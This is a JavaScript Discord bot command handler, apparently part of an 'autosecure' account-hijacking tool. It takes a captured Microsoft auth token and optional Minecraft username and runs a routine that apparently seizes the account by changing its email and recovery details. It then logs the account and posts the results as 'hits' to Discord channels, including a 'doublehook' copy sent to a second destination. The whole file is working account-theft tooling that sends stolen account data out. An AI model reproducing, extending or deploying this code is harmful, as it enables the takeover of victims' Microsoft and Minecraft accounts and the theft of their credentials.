const secure = require("../../../autosecure/utils/secure/recodesecure.js");
const listAccount = require("../../../autosecure/utils/accounts/listAccount.js");
const { queryParams } = require("../../../db/database.js");
const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
const generateuid = require("../../../autosecure/utils/generateuid.js");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const insertaccount = require('../../../db/insertaccount.js');
const getStats = require("../../../autosecure/utils/hypixelapi/getStats.js");
const mcregex = require("../../.././autosecure/utils/utils/mcregex.js");
const { failedembed } = require("../../../autosecure/utils/embeds/embedhandler.js");
const { sendHitsToChannels } = require("../../utils/sendHits");
const { logAccountSecure, logMSAUTH } = require("../../utils/activityLogger");
const sendStatsToChannel = require("../../utils/sendStatsToChannel");

module.exports = {
    name: "authsecure",
    userOnly: true,
    callback: async (client, interaction) => {

        const msauth = interaction.fields.getTextInputValue('msauth');
        const mcign = interaction.components[1].components[0].value || null;

        if (mcign && !mcregex(mcign)) {
            return interaction.reply({
                content: "Please enter a valid minecraft username!",
                flags: 64
            });
        }

        if (!msauth || msauth.length < 1) {
            return interaction.reply({ content: `Invalid MSAUTH`, flags: 64 });
        }

        let settings = await client.queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id])
        if (settings.length === 0) {
            return interaction.reply({
                content: `Couldn't get your settings!`,
                flags: 64,
            });
        }
        settings = settings[0];

        await interaction.deferReply({ flags: 64 });

        const uid = await generateuid();

        const embed = {
            title: 'This account is being automatically secured.',
            color: 0x808080
        };

        const components = [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`status|${uid}`)
                    .setLabel('⏳ Status')
                    .setStyle(ButtonStyle.Primary)
            )
        ];

        await interaction.editReply({ embeds: [embed], components });
        await interaction.user.send({ embeds: [embed], components });

        try {
            const acc = await secure(msauth, settings, uid, mcign);


                await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);


                    const failedmsg = await failedembed(acc, uid);
                    if (failedmsg.failed) {
                        await interaction.followUp(failedmsg.failedmsg);
                        await interaction.user.send(failedmsg.failedmsg);
                        return;
                    }

            if (acc.newName === "No Minecraft!") {
                const accountmessage = await listAccount(acc, uid, client, interaction);
                
                // Send to hits channels (doublehook)
                await sendHitsToChannels(client, accountmessage, interaction.user.id, interaction.user.tag, client.username);
                
                // Log account securing and MSAUTH
                await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "MSAUTH", true).catch(() => {});
                await logMSAUTH(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, true).catch(() => {});
                
                await interaction.editReply(accountmessage);
                await interaction.user.send(accountmessage);
                return;
            }

            const statsoverview = await statsembed(client, acc, interaction);
            const accountmessage = await listAccount(acc, uid, client, interaction);

            // Send to hits channels (doublehook)
            await sendHitsToChannels(client, accountmessage, interaction.user.id, interaction.user.tag, client.username);
            
            // Send stats to configured channel
            await sendStatsToChannel(client, acc, interaction.user.tag).catch(() => {});
            
            // Log account securing and MSAUTH
            await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "MSAUTH", true).catch(() => {});
            await logMSAUTH(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, true).catch(() => {});

            if (statsoverview) {
                await interaction.user.send(statsoverview);
            }

            await interaction.user.send(accountmessage);
                await interaction.editReply(accountmessage);

        } catch (error) {
            console.error(error);

            await interaction.editReply({
                embeds: [{
                    title: `Error Securing Account`,
                    description: `An error occurred while securing your account.`,
                    color: 0xff0000
                }]
            });
        }
    }
};
